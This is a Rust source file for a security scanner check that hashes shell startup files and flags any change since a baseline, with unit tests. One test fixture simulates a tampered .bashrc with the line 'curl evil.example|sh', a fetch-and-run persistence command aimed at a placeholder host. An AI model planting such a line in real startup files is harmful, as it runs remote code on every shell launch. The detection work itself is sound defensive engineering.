//! Shell rc file change detection.
//!
//! Shell startup files are a classic persistence surface: appending a line
//! to `~/.bashrc` runs on every interactive shell. These files live under
//! `$HOME` (classification rule 1 "out of scan scope" for the `/usr` drift
//! tree), so they get their own trust-on-first-use content baseline: any
//! change to a tracked rc file after the baseline is captured is flagged.

use super::{diff_surface, sha256_hex, Check, CheckError, CheckOutcome, ScanContext, SurfaceItem};

/// Rc / profile files tracked, relative to `$HOME`.
const RC_FILES: &[&str] = &[
    ".bashrc",
    ".bash_profile",
    ".bash_login",
    ".bash_logout",
    ".profile",
    ".zshrc",
    ".zprofile",
    ".zshenv",
    ".zlogin",
    ".kshrc",
    ".config/fish/config.fish",
];

pub struct ShellRcCheck;

impl Check for ShellRcCheck {
    fn name(&self) -> &'static str {
        "shell-rc"
    }

    fn surface(&self) -> &'static str {
        "shell-rc"
    }

    fn run(&self, ctx: &ScanContext<'_>) -> Result<CheckOutcome, CheckError> {
        let mut current = Vec::new();
        for rel in RC_FILES {
            let path = ctx.home.join(rel);
            // Only track files that exist and are readable; a missing rc file
            // is not a finding.
            if let Ok(contents) = ctx.sys.read_to_string(&path) {
                let key = path.to_string_lossy().into_owned();
                current.push(SurfaceItem {
                    detail: format!("shell rc file changed since baseline: {key}"),
                    value: sha256_hex(&contents),
                    key,
                });
            }
        }
        diff_surface(ctx, self.name(), self.surface(), current)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::stores::scans::ScanStore;
    use crate::testkit::MockInspector;
    use std::path::PathBuf;

    fn run(sys: &MockInspector, scans: &ScanStore) -> CheckOutcome {
        let ctx = ScanContext {
            sys,
            deployment: None,
            home: PathBuf::from("/home/tester"),
            scans,
        };
        ShellRcCheck.run(&ctx).unwrap()
    }

    #[test]
    fn baselines_then_flags_modification() {
        let scans = ScanStore::open_in_memory().unwrap();
        let sys = MockInspector::new().with_file("/home/tester/.bashrc", "export PATH=$PATH\n");
        // First run captures baseline.
        assert!(matches!(
            run(&sys, &scans),
            CheckOutcome::Ran {
                baselined: true,
                ..
            }
        ));

        // Tamper with .bashrc.
        let sys2 = MockInspector::new().with_file(
            "/home/tester/.bashrc",
            "export PATH=$PATH\ncurl evil.example|sh\n",
        );
        match run(&sys2, &scans) {
            CheckOutcome::Ran {
                anomalies,
                baselined,
            } => {
                assert!(!baselined);
                assert_eq!(anomalies.len(), 1);
                assert!(anomalies[0].path.ends_with(".bashrc"));
                assert_eq!(anomalies[0].check, "shell-rc");
            }
            other => panic!("unexpected {other:?}"),
        }
    }

    #[test]
    fn unchanged_rc_file_produces_no_finding() {
        let scans = ScanStore::open_in_memory().unwrap();
        let sys = MockInspector::new().with_file("/home/tester/.zshrc", "alias ll='ls -l'\n");
        run(&sys, &scans);
        match run(&sys, &scans) {
            CheckOutcome::Ran { anomalies, .. } => assert!(anomalies.is_empty()),
            other => panic!("unexpected {other:?}"),
        }
    }

    #[test]
    fn newly_appearing_rc_file_is_flagged_after_baseline() {
        let scans = ScanStore::open_in_memory().unwrap();
        let sys = MockInspector::new().with_file("/home/tester/.bashrc", "a\n");
        run(&sys, &scans); // baseline with just .bashrc
        let sys2 = MockInspector::new()
            .with_file("/home/tester/.bashrc", "a\n")
            .with_file("/home/tester/.zshrc", "newly added\n");
        match run(&sys2, &scans) {
            CheckOutcome::Ran { anomalies, .. } => {
                assert_eq!(anomalies.len(), 1);
                assert!(anomalies[0].path.ends_with(".zshrc"));
            }
            other => panic!("unexpected {other:?}"),
        }
    }
}
